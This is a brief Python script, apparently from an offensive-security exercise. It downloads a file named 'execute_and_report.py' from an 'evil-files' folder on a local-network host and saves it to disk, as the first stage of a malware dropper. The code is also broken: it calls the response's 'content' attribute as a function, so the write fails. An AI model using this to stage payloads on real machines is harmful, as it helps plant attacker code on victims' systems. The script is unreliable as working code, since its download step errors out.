import requests

def downlaod(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    f = open(file_name, "wb")
    f.write(get_response.content())

downlaod("http://192.168.1.154/evil-files/execute_and_report.py")